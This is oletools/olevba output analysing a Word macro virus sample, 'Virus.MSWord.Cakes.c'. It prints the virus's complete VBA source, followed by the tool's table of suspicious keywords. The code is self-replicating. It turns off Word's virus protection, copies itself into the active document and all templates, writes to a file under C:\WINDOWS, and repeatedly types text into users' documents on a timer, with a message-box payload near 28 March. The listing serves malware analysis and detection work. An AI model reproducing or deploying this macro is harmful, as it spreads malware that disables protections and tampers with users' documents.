olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cakes.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cakes.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO L_.bas 
in file: ./Virus.MSWord.Cakes.c - OLE stream: 'Macros/VBA/L_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'V1.1
'4/10/97
'MJRN-MF-TA
Const Refresh = "00:50:00"
Const Boom = "28/3/"
Sub AutoNew()
        Options.VirusProtection = True
        On Error Resume Next
        Application.OrganizerCopy _
            Source:=ThisDocument.FullName, _
            Destination:=ActiveDocument.FullName, _
            Name:="L_", _
            Object:=wdOrganizerObjectProjectItems
        For Each d In Templates
        If (ThisDocument.FullName <> d.FullName) Then
            Application.OrganizerDelete _
            Source:=d.FullName, _
            Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=d.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            d.Save
        End If
        Next d
End Sub
Sub AutoOpen()
        Options.VirusProtection = False
        On Error Resume Next
        If (ThisDocument.FullName <> ActiveDocument.FullName) Then
            Application.OrganizerDelete _
                Source:=ActiveDocument.FullName, _
                Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=ActiveDocument.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            ActiveDocument.Save
        End If
        For Each d In Templates
        If (ThisDocument.FullName <> d.FullName) Then
            Application.OrganizerDelete _
                Source:=d.FullName, _
                Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=d.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            d.Save
        End If
        Next d
End Sub
Sub AutoExec()
        Options.VirusProtection = False
        On Error Resume Next
        
        Dim f As Integer
        f = FreeFile
        Dim c As Integer
        Open "C:\WINDOWS\MAJORANA.E" For Append As f Len = Len(c)
        
        c = Rnd * 1000
        Write #f, c
        Close f
        
        Dim v As Date
        v = DateValue(Boom & Year(Now))
        If (Date >= v) And (Date <= v + 2) Then
            Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto"
        Else
            Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto2"
        End If
End Sub
Sub effetto()
    On Error Resume Next
    v = MsgBox("Hello! This is time of cakes.", , "Hello?")
End Sub
Sub effetto2()
    On Error Resume Next
    s = " Ettore Majorana (1906-1938?) "
    Selection.TypeText Text:=s
    Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto2"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

